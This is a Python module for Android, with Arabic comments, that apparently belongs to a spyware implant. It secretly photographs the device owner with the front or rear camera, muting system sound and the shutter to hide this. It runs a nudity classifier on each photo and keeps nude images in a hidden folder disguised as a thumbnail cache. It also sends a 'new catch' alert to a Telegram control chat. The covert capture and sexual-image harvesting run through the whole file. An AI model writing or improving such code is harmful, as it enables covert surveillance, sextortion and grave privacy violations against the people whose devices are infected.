# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة مع التمويه ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الانتظار (موهم كمجلد مصغرات)

for d in [P, T, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات الأساسية (مع التسامح) ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# تحديد ما إذا كانت مكتبات الذكاء الاصطناعي متوفرة (نفحص هنا فقط، دون استيراد فعلي)
# سنقوم بالاستيراد الفعلي داخل الدوال
AI_AVAILABLE = False
try:
    import numpy as np
    from PIL import Image
    AI_AVAILABLE = True
except ImportError:
    # إذا فشل الاستيراد، سنحاول مجدداً داخل الدوال (لن نمنع تحميل الكلاس)
    pass


class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                # NudeDetector instance
        self.busy = False
        self._old_volume = -1

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
            return b >= 15 or c
        except:
            return True

    # ========== كتم صوت النظام ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== التقاط صورة باستخدام Camera1 API (مستقر وصامت) ==========
    def capture(self, cam_id=0):
        """
        تلتقط صورة من الكاميرا (0 خلفية, 1 أمامية) باستخدام Camera1 API.
        تعيد مسار الصورة المحفوظة (jpg) أو None في حال الفشل.
        """
        if self.busy or not self._power_ok():
            return None

        self.busy = True
        out_path = None
        camera = None

        if JNI:
            self._mute_audio(True)
            try:
                Camera = autoclass('android.hardware.Camera')
                CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
                number_of_cameras = Camera.getNumberOfCameras()

                camera_id = -1
                if cam_id == 0:
                    camera_id = 0
                elif cam_id == 1:
                    for i in range(number_of_cameras):
                        info = CameraInfo()
                        Camera.getCameraInfo(i, info)
                        if info.facing == CameraInfo.CAMERA_FACING_FRONT:
                            camera_id = i
                            break
                else:
                    camera_id = 0

                if camera_id == -1:
                    logging.error("No suitable camera found")
                    return None

                camera = Camera.open(camera_id)

                parameters = camera.getParameters()
                supported_sizes = parameters.getSupportedPictureSizes()
                if supported_sizes:
                    target_area = 1024 * 768
                    best_size = min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
                    parameters.setPictureSize(best_size.width, best_size.height)

                parameters.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
                parameters.set("shutter-sound", 0)

                if cam_id == 1:
                    parameters.setRotation(270)
                else:
                    parameters.setRotation(90)

                camera.setParameters(parameters)

                out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")

                image_saved = threading.Event()

                class PicCallback(PythonJavaClass):
                    __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, cam):
                        with open(out_path, 'wb') as f:
                            f.write(data)
                        image_saved.set()

                camera.startPreview()
                camera.takePicture(None, None, PicCallback())
                image_saved.wait(5)
                camera.stopPreview()

            except Exception as e:
                logging.error(f"Camera capture error: {e}")
                out_path = None
            finally:
                if camera:
                    try:
                        camera.release()
                    except:
                        pass
                self._mute_audio(False)
                gc.collect()

        self.busy = False
        return out_path

    # ========== تحضير الصورة لـ AI (الاستيراد هنا فقط) ==========
    def _prepare_for_ai(self, path):
        """تحويل الصورة إلى صيغة مناسبة للنموذج (224x224, float32)"""
        try:
            # استيراد numpy و PIL داخل الدالة للتعامل مع غيابهما
            from PIL import Image
            import numpy as np
        except ImportError:
            return None

        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط + تحليل + إشعار + تخزين ==========
    def harvest(self, cam_id=0):
        """
        تلتقط صورة، تحللها عبر الـ AI، ترسل إشعاراً إذا كانت حساسة، وتنقل الصورة إلى مجلد الانتظار.
        """
        pic_path = self.capture(cam_id)
        if not pic_path or not os.path.exists(pic_path):
            return

        is_nude = False
        confidence = 0.0

        # التحقق من وجود كاشف ونموذج AI
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            input_data = self._prepare_for_ai(pic_path)
            if input_data is not None:
                try:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > 0.85:
                        is_nude = True
                except Exception as e:
                    logging.error(f"AI analysis error: {e}")

        if is_nude:
            # إرسال إشعار فوري لمجموعة التحكم
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # نقل الصورة إلى مجلد الانتظار
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                os.rename(pic_path, dest)
                logging.info(f"Moved to queue: {dest}")
            except Exception as e:
                logging.error(f"Move error: {e}")
                if os.path.exists(pic_path):
                    os.remove(pic_path)
        else:
            # حذف الصورة العادية فوراً
            if os.path.exists(pic_path):
                os.remove(pic_path)


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
